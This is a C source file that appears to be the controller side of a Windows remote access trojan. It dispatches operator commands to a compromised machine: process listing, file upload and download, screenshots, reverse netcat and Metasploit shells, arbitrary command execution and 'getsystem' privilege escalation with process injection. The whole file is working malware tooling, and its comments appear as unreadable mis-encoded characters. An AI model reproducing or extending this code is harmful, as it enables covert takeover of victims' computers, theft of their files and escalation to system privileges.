#include "command.h"

// ��ȡʱ���
void GetTimestamp(char str[])
{
	time_t now;
	time(&now);
	_itoa_s((int)now, str, 25, 10);
}

// �����˵�
BOOL Help(char cmd[])
{
	// �Ƿ�ִ��help����
	if (_strnicmp(cmd, "help", 4) != 0)
		return FALSE;

	printf("\n");
	printf("����\t\t����\n");
	printf("-------\t\t-----------\n");
	printf("help\t\t������Ϣ\n");
	printf("ps\t\t�г��������еĽ���\n");
	printf("getpid\t\t��ȡ��ǰ����pid\n");
	printf("drive\t\t�г��̷�\n");
	printf("download\t�����ļ�\n");
	printf("upload\t\t�ϴ��ļ�\n");
	printf("screen\t\t��Ļ��ͼ\n");
	printf("nc\t\t����nc\n");
	printf("msf\t\t����msf\n");
	printf("getsystem\t������Ȩ��system\n");

	return TRUE;
}

// �ϴ��ļ�
// ִ��upload���� ����TRUE ����FALSE
BOOL Upload(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��upload����
	if (_strnicmp(cmd, "upload", 6) != 0)
		return FALSE;

	char file[128] = { 0 };
	ZeroMemory(file, sizeof(file));
	// ��ȡ�ļ���
	memcpy(file, cmd + 7, strlen(cmd) - 7);
	printf("upload %s\n", file);

	FILE* fp;
	errno_t err;
	err = fopen_s(&fp, file, "rb");
	// �ļ�������
	if (err != 0 || fp == NULL)
	{
		printf("file doesn't exist\n");
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// �����ļ���
	SendData(sServer, file, sizeof(file));

	// ��ȡ�ļ���С
	fseek(fp, 0, SEEK_END);
	int fileSize = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	printf("send file size is %d bytes\n", fileSize);
	// �����ļ���С
	SendData(sServer, (char*)&fileSize, sizeof(fileSize));

	if (IsRecvError(sServer))
	{
		printf("can't open file path\n");
		return TRUE;
	}

	// �����ļ�����
	char buffer[256] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));

	int size;
	while (!feof(fp))
	{
		size = fread(buffer, 1, sizeof(buffer), fp);
		send(sServer, buffer, size, 0);
	}

	Sleep(1000);
	fclose(fp);
	SendData(sServer, "over", 5);
	printf("send file over\n");

	// ��ȡ�Է��ļ�·��
	RecvData(sServer, buffer, sizeof(buffer));
	printf("upload to %s\n", buffer);
	return TRUE;
}

// �����ļ�
// ִ��download���� ����TRUE ���� FALSE
BOOL Download(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��download����
	if (_strnicmp(cmd, "download", 8) != 0)
		return FALSE;

	char file[128] = { 0 };
	ZeroMemory(file, sizeof(file));

	if (IsRecvError(sServer))
	{
		printf("file doesn't exist\n");
		return TRUE;
	}

	// ��ȡ�ļ���
	RecvData(sServer, file, sizeof(file));

	int fileSize;
	// ��ȡ�ļ���С
	RecvData(sServer, (char*)&fileSize, sizeof(fileSize));
	printf("recv file size is %d bytes\n", fileSize);

	// ��ȡ��ǰ·��
	char path[255] = { 0 };
	ZeroMemory(path, sizeof(path));
	getcwd(path, 255);

	// �ļ���׺��
	char* extension = strrchr(file, '.');

	// ��ȡʱ���
	char time[25];
	GetTimestamp(time);

	// �����ļ�·��
	strcat_s(path, 255, "\\");
	strcat_s(path, 255, time);
	strcat_s(path, 255, extension);

	FILE* fp = fopen(path, "wb");
	char buffer[256];
	if (fp == NULL || fp == 0)
	{
		printf("can't open file path\n");
		// ���ʹ�����Ϣ���Է�
		SendError(sServer);
		return TRUE;
	}

	// ���߶Է����Խ����ļ�������
	SendSuccess(sServer);

	// �����ļ�����
	printf("download %s\n", file);
	while (TRUE)
	{
		int size = recv(sServer, buffer, sizeof(buffer), 0);
		if (size == 0 || strcmp(buffer, "over") == 0)
			break;

		// д���ļ�
		fwrite(buffer, 1, size, fp);
	}

	fclose(fp);
	printf("save file to %s\n", path);
	return TRUE;
}

// �л�·��
BOOL ChangePath(char cmd[])
{
	// �Ƿ�ִ��cd����
	if (_strnicmp(cmd, "cd", 2) != 0)
		return FALSE;

	return TRUE;
}

// ��������
BOOL Screen(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��screen����
	if (_strnicmp(cmd, "screen", 6) != 0)
		return FALSE;

	if (IsRecvError(sServer))
	{
		printf("fail to screen\n");
		return TRUE;
	}

	char buffer[255] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));
	// ���տͻ��˽�����Ϣ
	RecvData(sServer, buffer, sizeof(buffer));
	
	// ����ͼƬ
	char downloadCmd[255] = { 0 };
	ZeroMemory(downloadCmd, 0);
	strcat_s(downloadCmd, 255, "download ");
	strcat_s(downloadCmd, 255, buffer);
	Download(sServer, downloadCmd);
	return TRUE;
}

// �鿴������Ϣ����
BOOL PS(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��ps����
	if (_strnicmp(cmd, "ps", 2) != 0)
		return FALSE;

	// ��ȡ������Ϣʧ��
	if (IsRecvError(sServer))
	{
		printf("fail to exec ps\n");
		return TRUE;
	}

	char buffer[256] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));
	// ���ս�����
	RecvData(sServer, buffer, sizeof(buffer));

	printf("\n");
	printf("Process List\n");
	printf("============\n");
	printf("\n");

	printf("%-16s%-40s%-16s%s\n", "PID", "Name", "Arch", "User");
	printf("%-16s%-40s%-16s%s\n", "---", "----", "----", "----");

	// ������
	int processCnt = atoi(buffer);
	// ���������Ϣ
	for (int i = 0; i < processCnt; i++)
	{
		// ����pid
		RecvData(sServer, buffer, sizeof(buffer));
		printf("%-8s\t", buffer);
		ZeroMemory(buffer, sizeof(buffer));

		// ���ս�����
		RecvData(sServer, buffer, sizeof(buffer));
		printf("%-35s\t", buffer);
		ZeroMemory(buffer, sizeof(buffer));

		// ����λ��
		RecvData(sServer, buffer, sizeof(buffer));
		printf("%-8s\t", buffer);
		ZeroMemory(buffer, sizeof(buffer));

		// ��������\�û���
		RecvData(sServer, buffer, sizeof(buffer));
		printf("%s\t", buffer);
		ZeroMemory(buffer, sizeof(buffer));

		printf("\n");
	}
	return TRUE;
}

// ����NC
BOOL NC(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��nc����
	if (_strnicmp(cmd, "nc ", 3) != 0)
		return FALSE;

	// nc��ʽ���� ���� ����ncʧ��
	if (IsRecvError(sServer) || IsRecvError(sServer))
	{
		printf("fail to reverse nc\n");
		return TRUE;
	}

	printf("success reverse nc\n");
	return TRUE;
}

// ��������
BOOL Drive(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��drive����
	if (_strnicmp(cmd, "drive", 5) != 0)
		return FALSE;

	RecvCmdResult(sServer);
	return TRUE;
}

// ����msf
BOOL MSF(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��msf����
	if (_strnicmp(cmd, "msf ", 4) != 0)
		return FALSE;

	// ����msf��ʽ ���� msf����ʧ��
	for (int i = 0; i < 8; i++)
	{
		if (IsRecvError(sServer))
		{
			printf("fail to reverse msf\n");
			return TRUE;
		}
	}

	printf("success reverse msf\n");
	return TRUE;
}

// ��Ȩ ����Ա��Ȩ��system
BOOL GetSystem(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��getsystem����
	if (_strnicmp(cmd, "getsystem", 9) != 0)
		return FALSE;

	// û�й���ԱȨ��
	if (IsRecvError(sServer))
	{
		printf("current user is not an administrator\n");
		return TRUE;
	}

	// ��ȡ�����б�ʧ��
	if (IsRecvError(sServer))
	{
		printf("getsystem fail\n");
		return TRUE;
	}
	

	/* ����һ���µ�server.exe���������� */

	// ��������ƭ�ɹ� ����һ�������Ķ˿�
	// ��������ƭʧ�� ����"error"
	
	// ���ն˿�
	char port[20] = { 0 };
	ZeroMemory(port, sizeof(port));
	RecvData(sServer, port, sizeof(port));

	// ��ƭʧ��
	if (strcmp(port,"error") == 0)
	{
		printf("getsystem fail\n");
		return TRUE;
	}


	// ��ȡserver.exe ����·��
	TCHAR tempPath[MAX_PATH];
	GetModuleFileName(NULL, tempPath, MAX_PATH);
	// ת����char *��ʽ
	char currentPath[MAX_PATH] = { 0 };
	TcharToStr(tempPath, currentPath);

	// ���������ƴ��
	char cmdLine[MAX_PATH] = {0};
	ZeroMemory(cmdLine, sizeof(cmdLine));
	strcat(cmdLine, "\"");
	strcat(cmdLine, currentPath);
	strcat(cmdLine, "\" ");
	strcat(cmdLine, port);

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = {0};

	// �����0
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	// ����Server.exeʧ��
	if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOA)&si, &pi))
	{
		printf("exec Server.exe fail\n");
		SendError(sServer);
		return TRUE;
	}

	// �ȴ�1���� ��Server.exe����������
	Sleep(1000);
	// ���Խ�����ͨ����
	SendSuccess(sServer);
	printf("getsystem sucess\n");
	// �رվ��
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	
	// ˫��������������,����������Ϣ
	char buffer[20] = {0};
	RecvData(sServer, buffer, sizeof(buffer));
	printf("injection to %s\n", buffer);
	return TRUE;
}

// ��ȡpid
BOOL GetPID(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��getpid����
	if (_strnicmp(cmd, "getpid", 6) != 0)
		return FALSE;

	char buffer[10] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));
	RecvData(sServer, buffer, sizeof(buffer));
	printf("PID:%s\n", buffer);
	return TRUE;
}

// ִ������
void ExecCmd(SOCKET sServer, char cmd[])
{
	// ��������
	if (Help(cmd))
		return;

	// ��ȡpid
	if (GetPID(sServer, cmd))
		return;

	// ��Ȩ��system
	if (GetSystem(sServer, cmd))
		return;

	// ����MSF
	if (MSF(sServer, cmd))
		return;

	// ����NC
	if (NC(sServer, cmd))
		return;

	// �鿴����
	if (PS(sServer, cmd))
		return;

	// ��Ļ��ͼ
	if (Screen(sServer, cmd))
		return;

	// ִ���ļ��ϴ�
	if (Upload(sServer, cmd))
		return;

	// ִ���ļ�����
	if (Download(sServer, cmd))
		return;

	// ִ��cd����
	if (ChangePath(cmd))
		return;

	// ִ��cmd����
	RecvCmdResult(sServer);
}

// ����cmd����ִ�к�Ľ��
void RecvCmdResult(SOCKET sServer)
{
	if (IsRecvError(sServer))
	{
		printf("fail to exec\n");
		return;
	}

	// ��ѭ����������
	while (TRUE)
	{
		// ��������
		char buffer[1024];
		ZeroMemory(buffer, sizeof(buffer));
		RecvData(sServer, buffer, sizeof(buffer));

		// ����������
		if (strcmp(buffer, "SendOver") == 0)
		{
			break;
		}
		// ����õ�������
		printf("%s", buffer);
	}
}

// ��ȡ·��
void RecvPath(SOCKET sServer)
{
	char path[255] = { 0 };
	RecvData(sServer, path, sizeof(path));
	printf("%s\n", path);

}

// TCHARתCHAR *
void TcharToStr(const TCHAR* tchar, char* _char)
{
	int iLength;
	//��ȡ�ֽڳ���   
	iLength = WideCharToMultiByte(CP_ACP, 0, tchar, -1, NULL, 0, NULL, NULL);
	//��tcharֵ����_char    
	WideCharToMultiByte(CP_ACP, 0, tchar, -1, _char, iLength, NULL, NULL);
}